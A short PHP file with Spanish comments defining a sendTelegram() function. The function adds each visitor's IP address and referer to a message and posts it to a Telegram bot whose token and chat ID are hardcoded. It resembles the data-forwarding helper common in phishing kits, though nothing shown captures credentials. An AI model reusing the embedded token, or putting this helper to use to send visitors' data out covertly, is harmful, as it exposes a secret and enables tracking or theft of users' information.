<?php

function sendTelegram($message) {
    // Obtener IP del usuario y URL de referencia
    $userIp = $_SERVER['REMOTE_ADDR'] ?? 'IP no disponible';
    $refererLink = $_SERVER['HTTP_REFERER'] ?? 'Referencia no disponible';

    // Añadir IP y enlace al mensaje
    $message .= "\nIP del usuario: $userIp";
    $message .= "\nEnlace de referencia: $refererLink";

    // Configuración de Telegram
    $telegramApiUrl = 'https://api.telegram.org/bot7973242717:AAH3wAogcu8nj6rlXTOceG7NVUKJAj7XsAA/sendMessage';
    $telegramChatId = '-4658373730';

    // Datos de la solicitud
    $data = [
        'chat_id' => $telegramChatId,
        'text' => $message
    ];

    // Inicializar cURL
    $ch = curl_init($telegramApiUrl);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
    curl_setopt($ch, CURLOPT_TIMEOUT, 10);

    // Ejecutar cURL y obtener respuesta
    $response = curl_exec($ch);

    // Verificar si ocurrió un error
    if (curl_errno($ch)) {
        error_log('Error al enviar mensaje a Telegram: ' . curl_error($ch));
    }

    curl_close($ch);

    return $response;
}

?>
